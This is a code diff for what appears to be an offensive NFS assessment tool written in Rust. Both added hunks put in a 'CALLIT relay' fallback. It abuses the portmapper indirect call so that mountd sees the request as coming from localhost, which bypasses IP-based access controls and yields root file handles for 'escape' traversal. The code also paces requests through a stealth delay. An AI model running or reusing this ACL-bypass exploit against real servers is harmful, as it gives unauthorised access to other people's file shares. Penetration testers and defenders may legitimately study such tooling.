@@ -282,6 +282,7 @@ pub(crate) async fn run_fast(host: &str, export: &str, globals: &GlobalOpts) -> 
 // =============================================================================
 
 /// Phase 1 for fast mode: single export, single version, upward traversal only.
+#[expect(clippy::cognitive_complexity, reason = "multi-fallback seed acquisition pipeline is inherently branchy")]
 async fn phase1_gather_seeds_fast(host: &str, export: &str, addr: SocketAddr, mount: &NfsMountClient, stealth: &StealthConfig, nfs_port: u16, globals: &GlobalOpts) -> anyhow::Result<(Vec<DiscoveredExport>, Vec<EscapeSeed>, HashSet<Vec<u8>>)> {
     let exports = vec![DiscoveredExport { path: export.to_owned(), sources: vec!["operator"] }];
 
@@ -312,6 +313,21 @@ async fn phase1_gather_seeds_fast(host: &str, export: &str, addr: SocketAddr, mo
                 seeds.push(EscapeSeed { handle: mnt.handle, source: label, is_root: true, nfs_version: Some(2) });
             }
             active_version = Some(ActiveVersion::V2);
+        }
+    }
+
+    // CALLIT relay -- bypass IP-based ACLs via portmapper indirect call.
+    if active_version.is_none() {
+        stealth.wait().await;
+        if let Ok(mnt) = mount.mount_via_callit(addr, export).await {
+            let label = format!("CALLIT MNT {export}");
+            tracing::info!(export, "CALLIT relay succeeded -- mountd saw request from 127.0.0.1");
+            let _ = known_boundaries.insert(mnt.handle.as_bytes().to_vec());
+            if seen.insert(mnt.handle.as_bytes().to_vec()) {
+                let version = if mnt.handle.len() == 32 { Some(2) } else { Some(3) };
+                seeds.push(EscapeSeed { handle: mnt.handle, source: label, is_root: true, nfs_version: version });
+            }
+            active_version = Some(if seeds.last().and_then(|s| s.nfs_version) == Some(2) { ActiveVersion::V2 } else { ActiveVersion::V3 });
         }
     }
 
@@ -545,6 +561,25 @@ async fn acquire_handles_for_export(host: &str, export_path: &str, addr: SocketA
             None
         },
     };
+
+    // CALLIT relay -- bypass IP-based ACLs via portmapper indirect call (RFC 1057 Appendix A, proc 5).
+    if v3_handle.is_none() && v1_handle.is_none() {
+        stealth.wait().await;
+        match mount.mount_via_callit(addr, export_path).await {
+            Ok(mnt) => {
+                let label = format!("CALLIT MNT {export_path}");
+                tracing::info!(export = export_path, "CALLIT relay succeeded -- mountd saw request from 127.0.0.1");
+                let _ = known_boundaries.insert(mnt.handle.as_bytes().to_vec());
+                if seen.insert(mnt.handle.as_bytes().to_vec()) {
+                    let version = if mnt.handle.len() == 32 { Some(2) } else { Some(3) };
+                    seeds.push(EscapeSeed { handle: mnt.handle, source: label, is_root: true, nfs_version: version });
+                }
+            },
+            Err(e) => {
+                tracing::debug!(export = export_path, "CALLIT relay failed: {e}");
+            },
+        }
+    }
 
     // NFSv4 LOOKUP
     let v4_handle = if let Some(fh) = acquire_v4_lookup_handle(host, export_path, globals).await {
